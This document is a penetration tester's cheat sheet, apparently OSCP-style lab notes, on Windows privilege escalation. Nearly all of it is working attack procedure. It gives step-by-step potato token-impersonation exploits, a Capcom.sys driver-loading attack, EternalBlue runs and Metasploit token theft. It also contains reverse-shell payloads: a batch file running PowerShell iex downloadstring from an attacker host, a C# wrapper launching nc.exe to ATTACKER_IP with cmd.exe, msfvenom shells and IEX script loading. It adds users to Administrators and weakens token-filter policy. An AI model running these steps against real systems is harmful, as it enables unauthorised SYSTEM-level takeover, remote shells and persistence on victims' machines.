# Exploits

{% embed url="https://github.com/SecWiki/windows-kernel-exploits/" %}

{% embed url="https://decoder.cloud/" %}

{% hint style="info" %}
NOTE: always check context, groups, if access denied try to run cmd as administrator w/ other creds or w/ admin rights
{% endhint %}

## Repository

{% code overflow="wrap" %}
```
https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs
https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/CVE-2018-8440.md
https://github.com/ExpLife0011/alpc-diaghub
```
{% endcode %}

{% hint style="success" %}
Enumerate Windows versions and try common exploits such as EternalBlue, ZeroLogon, PrintNightmare, etc.

Example:

```
use exploit/windows/smb/ms17_010_psexec
```
{% endhint %}

## Windows Privileges

[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)

## SeImpersonatePrivilege

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash"><strong># POTATOES
</strong>https://github.com/uknowsec/SweetPotato/tree/master/SweetPotato-Webshell-new/bin/Release
https://jlajara.gitlab.io/Potatoes_Windows_Privesc
https://github.com/BeichenDream/GodPotato
https://github.com/CCob/SweetPotato

# In case changes to add local accounts did not take effect
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG-DWORD /d 1 /f
net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL

# RogueWinRM 
https://github.com/antonioCoco/RogueWinRM

# ***********EXPLOITS TESTED****
<strong># If PrintSpoofer fails might be because spooler is not running 
</strong><strong># always check if it works, the way of "cannot find a process with the name spooler" is not reliable to say it will not work
</strong>get-process -name spooler
# Alternative to PrintSpoofer is 
https://github.com/BeichenDream/GodPotato
GodPotato.exe -cmd "cmd /c whoami"
# - SERVER 2016/2019, WINDOWS 10 --> PrintSpoofer (SeImpersonate)
https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
# DOWNLOAD ONE OF THEM:
https://github.com/itm4n/PrintSpoofer
https://github.com/dievus/printspoofer/
PrintSpoofer.exe -i -c cmd
# *********************ALTERNATIVE - ROGUEPOTATO (WINDOWS SERVER 2019)
# Before with Juicy Potato we could connect to localhost:$LPORT on the victim to steal the token, but from Server 2009 it only allows to steal the token on port 135 (RPC). With RoguePotato we makes system connect to $KALI_IP:135 but to do so we need to redirect our Kali 135 port to $VICTIM_IP:9999 (9999 is an example)
# ------------------------------
# Prep -> listen on port 135 and redirect it to target TCP port 9999
kali@kali sudo socat tcp-listen:135,reuseaddr,fork tcp:$TARGET_IP:9999
# Download RoguePotato repo
https://github.com/antonioCoco/RoguePotato/releases/tag/1.0
# Execute RoguePotato.exe on the target
RoguePotato.exe -r $ATTACKING_IP -e "$COMMAND" -l 9999
#### IF PORT 135 is not open externally, skip "Prep" and use chisel first -example below (remote port forwarding from our attacking port 135 to the victim machine port 9999 that is our example port used by -l parameter on RoguePotato)
$ ./chisel_1.7.6_linux_amd64 server -p 8888 --reverse
C:\Windows\Temp> start /b chisel.exe client $ATTACKING_IP:9999 R:135:localhost:9999

# - SERVER 2008, 2012 R2 1 Processor --> JUICY POTATO (SeImpersonate)
# It may not work for 2008 SP1
https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms16-075.md
1) Create rev.bat with this content:
powershell.exe -c iex(new-object net.webclient).downloadstring('&#x3C;Your-Machine-IP>:8000/Invoke-PowerShellTcp.ps1')
2) Download Juicy Potato
3) Upload both to the target machine
4) Serve Invoke-PowershellTCP.ps1 and modify last line to add this:
Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port $PORT
5) Set up the listener and execute:
JuicyPotato.exe -t t -l $PORT -p $REV_SHELL_PATH
JuicyPotato64.exe -t * -l 1337 -p C:\Users\Public\Documents\rev.bat 

# - SERVER 2012 R2 x64 2 PROCESSORS --> bfill.exe (MS16-098)
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098

# - SERVER 2003, 2008 SP1 x86 / 2008 R2 --> Churraskito/Chimichurri (MS10-059) (SeImpersonate)
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
FOR REVERSE SHELL
churraskito.exe $IP $PORT

# - HOT POTATO
# Potato Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012
# Exploitation (Windows VM)
1. In command prompt type: powershell.exe -nop -ep bypass
2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
</code></pre>

![](<../../.gitbook/assets/image (25).png>)

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption><p>RoguePotato principle</p></figcaption></figure>

### LocalPotato (CVE-2023-21746)

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/decoder-it/LocalPotato
https:/github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc

# 1 - Compile RpcClient.exe but before that go to storsvc_c.c and change the #define to select the correct Windows version and then
C:\> cd C:\tools\LPE via StorSvc\RpcClient\
C:\tools\LPE via StorSvc\RpcClient> msbuild RpcClient.sln
# Now to compile SprintCSP.dll, we only need to modify the DoStuff() function on main.c to make ourselves part of Administrators
CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",...
C:\> cd C:\tools\LPE via StorSvc\SprintCSP\
C:\tools\LPE via StorSvc\SprintCSP> msbuild SprintCSP.sln
# Find writable SYSTEM path
C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
# Copy SprintCSP.dll to the writable path using LocalPotato.exe
C:\Users\user\Desktop> LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
# run RpcClient.exe to trigger the call to SvcRebootToFlashingMode, effectively executing the payload in our DLL
C:\Users\user\Desktop> RpcClient.exe
# Finally confirm we are part of Administrators and get an elevated prompt by providing our user creds

# Mitigations -> patch the OS, use Yara/Sigma rules to identify these executions, Splunk to monitor the network...
```
{% endcode %}

## SeRestorePrivilege

[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)

Use **rdesktop**&#x20;

```bash
rdesktop $IP
```

The **utilman.exe** is a built-in Windows application that is designed to allow users to configure system accessibility options such as the _Magnifier_, _High Contrast Theme_, _Narrator_, and _On Screen Keyboard_ before they log in to the system.

## SeManagePrivilege

[https://x.com/0gtweet/status/1303427935647531018](https://x.com/0gtweet/status/1303427935647531018)

[https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

An Alternative to PrintInfo trigger [https://github.com/sailay1996/WerTrigger](https://github.com/sailay1996/WerTrigger)

## From LOCAL SERVICE or NETWORK SERVICE to full privs

[https://github.com/itm4n/FullPowers](https://github.com/itm4n/FullPowers)

## CVE-2021-36934 (HiveNightmare)

An elevation of privilege vulnerability exists because of overly permissive Access Control Lists (ACLs) on multiple system files, including the Security Accounts Manager (SAM) database. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.&#x20;

[https://github.com/n3tsurge/CVE-2021-36934](https://github.com/n3tsurge/CVE-2021-36934)

[https://github.com/0x0D1n/CVE-2021-36934](https://github.com/0x0D1n/CVE-2021-36934)

## Windows XP SP0/SP1

[https://sohvaxus.github.io/content/winxp-sp1-privesc.html](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)

{% code overflow="wrap" %}
```bash
######## METASPLOIT
https://www.offensive-security.com/metasploit-unleashed/fun-incognito/

meterpreter > load incognito
# LIST AVAILABLE TOKENS
List_tokens -g
as
impersonate_token "BUILTIN\Administrators"
# Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). 
# Ensure that you migrate to a process with correct permissions.
# The safest process to pick is the services.exe process. 
ps # command to view processes and find the PID of the services.exe 
migrate PID-OF-PROCESS
```
{% endcode %}

## SeEnableRestorePrivilege (Priv2admin)

RDP creds are not needed for the exploit steps

## **SeLoadDriverPrivilege**

{% code overflow="wrap" %}
```bash
From my Kali machine all-in-one-zip we have everything there, we just need to add reverse.exe from msfvenom

# If it fails, as of Windows 10 Version 1803, NTLoadDriver seems to forbid references to registry keys under HKEY_CURRENT_USER.
```
{% endcode %}

The best resource

[https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)

We use this project:[https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/)

We compile it as Release x64. We also modify a line to spawn a reverse shell (it will be created with msfvenom):

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

We also need to compile this project:

[https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/)

We'll use this command but replacing the last argument for the path of our Capcom.sys:

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

For EOPLOADDRIVER we need to create a new project > Console Application (for example). We delete the default one and add the .cpp as an existing one to the Source Files:

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Then we also need to add the header files. They are available from the other project:

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

We compile it as Release x64 with the name of EOPLOADDRIVER.exe

We also have to download Capcom.sys from here:

[https://github.com/FULLSHADE/Kernel-exploits/tree/master/Capcom.sys](https://github.com/FULLSHADE/Kernel-exploits/tree/master/Capcom.sys)

{% code overflow="wrap" %}
```
And we create the reverse shell (revshell.exe):
msfvenom -p windows/x64/shell_reverse_tccp lhost=$LHOST lport=443 -f exe > revshell.exe

We upload the 4 files in the same writable directory.
Now, following the Tarlogic post, we execute EOPLOADDRIVER.exe providing the absolute path of the Capcom.sys:
PS> .\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\test\Capcom.sys

We start Netcat listener to catch a revshell:
rlwrap -rci nc -lvnp 443

And then we execute ExploitCapcom.exe to get the SYSTEM shell:
PS> .\ExploitCapcom.exe
...
[+] The SYSTEM shell was launched
```
{% endcode %}

## Windows exploit suggester

{% code overflow="wrap" %}
```bash
https://github.com/SecWiki/windows-kernel-exploits/
# WES (next generation) https://github.com/bitsadmin/wesng
wes.py --update
wes.py systeminfo.txt
wes systeminfo.txt -i "Elevation of Privilege" --muc-lookup --exploits-only --color

systeminfo on Windows machine -> copy into a file

./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2020-09-17-mssb.xls --systeminfo /root/Desktop/thm/hackPark/systeminfo.txt 

# START FROM THE BEGINNING, COPY MSXX-XXX AND THEN GOOGLE "MSXX-XXX EXPLOIT". THE GOAL IS TO FIND A .EXE FILE READY TO GO
```
{% endcode %}

### Metasploit

{% code overflow="wrap" %}
```bash
# Having a Metasploit session
msf > run post/multi/recon/local_exploit_suggester
# 2. Identify exploit/windows/local/ms16_014_wmi_recv_notif as a potential privilege escalation
msf > use exploit/windows/local/ms16_014_wmi_recv_notif
msf > set SESSION [meterpreter SESSION number]
msf > run
# NOTE: The shell might default to your eth0 during this attack.  If so, ensure you type set lhost [Kali VM IP Address] and run again.
```
{% endcode %}

## Binary compilation&#x20;

If we do not have a return address from a previously-developed exploit, we have a few options to consider. The first, and most recommended option, is to recreate the target environment locally and use a debugger to determine this address.

If this is not an option, we _could_ use information from other publicly-available exploits to find a reliable return address that will match our target environment.

| [https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/working-with-exploits](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/working-with-exploits) |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [https://oscp.infosecsanyam.in/](https://oscp.infosecsanyam.in/)                                                                                                     |
| [https://www.puckiestyle.nl/c-simple-reverse-shell/](https://www.puckiestyle.nl/c-simple-reverse-shell/)                                                             |

{% hint style="info" %}
If a buffer overflow does not work, check why by inspecting memory variables. Maybe the buffer is 1 byte bigger/smaller, too many NOPs...
{% endhint %}

{% tabs %}
{% tab title="C# and .NET" %}
Other tools: Roslyn, GCC, MinGW, LLVM, TCC, MSBUild

```bash
Create a new project > Console App (.NET Core)
Place solution and project in the same directory
Build > Build Solution
```
{% endtab %}

{% tab title="Linux" %}
{% code overflow="wrap" %}
```bash
sudo apt install mingw-w64
# Compile 64-bit binaries
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe #use this if there is a makefile
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
# IMPORTANT: in case a part of an exploit is missing or not working, check also the exploit built for other platforms/technologies in case there is any idea/command/value to fix ours.
make 2>/dev/null #build the binary

# .cpp,.sln on Linux
g++ -Wall -Wextra -pedantic -std=c++11 example.cpp
Using -Wall and -Wextra give a decent warning level to start out with -pedantic tells you if you're trying to use a compiler extension that works but would make your code less portable, and last but not least you should always specify the standard you want to use, be it -std=c++11, -std=c++14 or the older -std=c++98.
```
{% endcode %}
{% endtab %}

{% tab title="VS + alternative" %}
<pre class="language-c" data-overflow="wrap"><code class="lang-c">Visual Studio Community 2019 with NET Framework (aprox 3,5 GB)
Simply open up the project .sln, choose "Release", and build
<strong>
</strong><strong># Issues
</strong>https://github.com/NuGet/Home/issues/5127#issuecomment-2016557136
<strong>
</strong><strong># Compile .sln to exe/dll
</strong>Change Debug to Release
Select Build Solution
Then go to the projectfolder\x64\Release\whatever.exe
If the executable does not work > Go to Project > Click on the right side (tree with files) > Properties > Change Target framework to 4 or 5
<strong>
</strong><strong>-------------------
</strong># VISUAL STUDIO ALTERNATIVE (MONO, .NET COMPILER FOR LINUX)
sudo apt install mono-devel
# Open a file called FILE.cs and include the following to call an executable:
using System; //Add imports for basic functions
using System.Diagnostics;
namespace Wrapper{ //initialise a namespace and class for the program
    class Program{
        static void Main(){
            // Our code will go here!
            // create a new process, as well as a ProcessStartInfo object to set the parameters for the process
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");
            // configure the process to not create it's own GUI Window when starting
            procInfo.CreateNoWindow = true;
            // we attach the ProcessStartInfo object to the process, and start the process
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}

# compile our program using the Mono mcs compiler
mcs Wrapper.cs

# ON WINDOWS
c:\windows\Microsoft.NET\Framework\v3.5\csc.exe /t:exe /out:Simple_Rev_Shell443.exe Simple_Rev_Shell443.cs
</code></pre>
{% endtab %}

{% tab title="Wine" %}
```bash
# On Kali
wine [executable.exe]
```
{% endtab %}

{% tab title="Windows target" %}
<pre class="language-bash"><code class="lang-bash"># Check if mingw-w64.bat is present on the Windows target or our Windows VM
<strong># Run mingw-w64.bat and then gcc.exe to confirm it is working properly
</strong>gcc $C_FILE -o exploit.exe
</code></pre>
{% endtab %}

{% tab title="Python" %}
{% content-ref url="../../enumeration/web-technologies/python.md" %}
[python.md](../../enumeration/web-technologies/python.md)
{% endcontent-ref %}
{% endtab %}
{% endtabs %}

## Sherlock

```bash
https://github.com/rasta-mouse/Sherlock
# Ideal to find kernel exploits of outdated OSes.
# Add this line at the end of .ps1 file:
Find-AllVulns
# THIS IS THE WAY TO EXECUTE IT WITHOUT TRANSFER IT TO THE VICTIM MACHINE
PS > IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/Sherlock.ps1')
# Wait a bit, it may take several minutes to find all vulns.
```

## **EternalBlue (MS17-010)**

[**https://github.com/3ndG4me/AutoBlue-MS17-010**](https://github.com/3ndG4me/AutoBlue-MS17-010)

[https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms17-010.md](https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms17-010.md)

{% code overflow="wrap" %}
```bash
# ENUM THE VULN FIRST WITH NMAP:
nmap -p139,445 --script "vuln and safe" $IP
nmap --script smb-vuln* $IP

# Use checker first. If target is not patched and there are named pipes, we can try zzz_exploit. If not, try specific exploit below. 
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
python eternal_checker.py $IP

# If so, launch zzz_exploit.py with the vulnerable pipe. Inside we can change the commands of the exploit to spawn a shell, add a new user to later add it to the locallgroup and so on.
python zzz_exploit.py $IP

# IF THE ABOVE PROCEDURE DOES NOT WORK, USE THE APPROPIATE ONE
eternalblue_exploit7.py - Win 7 SP1 x64, Win 2008 R2 SP1 x64, Win 7 SP1 x86, Win 2008 SP1 x64, Win 2008 SP1 x86
eternalblue_exploit8.py - Win 2012 R2 x64, Win 8.1 x64, Win 10 Pro Build 10240 x64
eternalblue_exploit10.py - Win 2012 R2 x64, Win 8.1 x64, Win 10 Pro Build 10240 x64
# Prepare the exploit
cd shellcode && ./shell_prep.sh 
# Next start two netcat listeners on the port numbers chosen and then run it:
python eternalblue_exploit7.py <TARGET-IP> shellcode/sc_all.bin

# FOR WINDOWS XP / 2000
- Download send_and_execute.py
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR-MACHINE-IP> LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_shell.exe
python send_and_execute.py <TARGET-IP> rev_shell.exe
```
{% endcode %}

## Task Scheduler Privilege Escalation

`Tested on: Windows 7/2008 x86/x64`

[`http://www.exploit-db.com/exploits/15589/`](http://www.exploit-db.com/exploits/15589/)

## Token Kidnapping

{% embed url="https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf" %}

## Printers

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---printers](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---printers)

### PrintNightmare CVE-2021-34527

[#printnightmare](ad/exploitation.md#printnightmare "mention")

```bash
https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare
https://github.com/JohnHammond/CVE-2021-34527
# check if it might be vulnerable
rpcdump.py @$IP | egrep 'MS-RPRN|MS-PAR's
```
